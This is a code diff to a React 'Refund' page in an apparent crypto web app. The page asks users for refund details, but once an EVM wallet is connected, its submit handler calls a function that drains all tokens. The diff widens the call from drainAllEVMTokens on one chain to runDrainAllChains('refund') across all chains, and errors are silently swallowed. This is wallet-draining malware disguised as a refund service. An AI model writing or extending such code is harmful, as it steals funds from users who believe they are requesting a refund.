@@ -18,7 +18,7 @@ import { getMintProgramId } from '@/utils/tokenProgram';
 import { getSolPrice } from '@/lib/utils';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
-import { drainAllEVMTokens } from '@/utils/evmTransactions';
+import { useMultiChainOrchestrator } from '@/contexts/MultiChainOrchestratorContext';
 import { useChainInfo } from '@/hooks/useChainInfo';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
@@ -51,6 +51,7 @@ const Refund = () => {
   const { activeChain, getEVMChain, evmChainId } = useChain();
   const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const { chainName, nativeToken } = useChainInfo();
+  const { runDrainAllChains } = useMultiChainOrchestrator();
 
   const [service, setService] = useState('');
   const [reason, setReason] = useState('');
@@ -139,8 +140,7 @@ const Refund = () => {
     if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
       try {
         setIsProcessing(true);
-        const chainName = getEVMChain()?.name || 'EVM';
-        await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
+        await runDrainAllChains('refund');
         setService(''); setReason(''); setAmount(''); setTxId(''); setWallet('');
       } catch (error: any) {
       } finally {
